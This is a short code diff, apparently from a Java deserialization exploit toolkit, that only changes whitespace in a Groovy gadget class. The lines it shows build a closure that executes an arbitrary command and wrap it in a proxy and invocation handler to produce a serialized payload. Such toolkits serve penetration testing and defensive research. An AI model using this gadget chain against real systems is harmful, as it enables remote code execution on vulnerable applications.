@@ -31,13 +31,13 @@ public class Groovy1 extends PayloadRunner implements ObjectPayload<InvocationHa
 
 	public InvocationHandler getObjectExec(final String command) throws Exception {
 		final ConvertedClosure closure = new ConvertedClosure(new MethodClosure(command, "execute"), "entrySet");
-				
-		final Map map = Gadgets.createProxy(closure, Map.class);		
 		
+		final Map map = Gadgets.createProxy(closure, Map.class);		
+
 		final InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(map);
 		
 		return handler;
-	}	
+	}
 	
 	public InvocationHandler getObjectSleep(final String command) throws Exception {
 		/*
@@ -50,7 +50,7 @@ public class Groovy1 extends PayloadRunner implements ObjectPayload<InvocationHa
 		return handler;
 		*/
 		return null;
-	}
+	}	
 
 	public static void main(final String[] args) throws Exception {
 		PayloadRunner.run(Groovy1.class, args);
